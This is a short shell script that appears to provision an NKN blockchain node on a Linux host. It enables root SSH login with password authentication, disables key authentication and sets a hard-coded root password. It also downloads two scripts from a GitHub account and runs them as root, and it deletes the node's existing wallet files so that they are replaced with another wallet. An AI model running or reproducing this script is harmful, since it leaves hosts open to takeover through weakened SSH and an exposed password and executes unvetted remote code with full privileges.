#!/bin/sh
sudo su
cat >>/etc/ssh/sshd_config <<EOF
PermitRootLogin yes
PasswordAuthentication yes
PubkeyAuthentication no
EOF
sudo echo 'root:Ytb1452@!@#$%Aa' | chpasswd
sudo apt-get update && sudo wget -O install.sh 'https://raw.githubusercontent.com/taikhoanxzc004/nkn/main/nkndinstall.sh'; sudo bash install.sh && sudo systemctl stop nkn-commercial.service && rm -rf /home/nknag/nkn-commercial/services/nkn-node/wallet.json && rm -rf /home/nknag/nkn-commercial/services/nkn-node/wallet.pswd && sudo wget -O wallet.sh 'https://raw.githubusercontent.com/taikhoanxzc004/nkn/main/wallet.sh'; sudo bash wallet.sh && sudo systemctl daemon-reload && systemctl start nkn-commercial.service && reboot
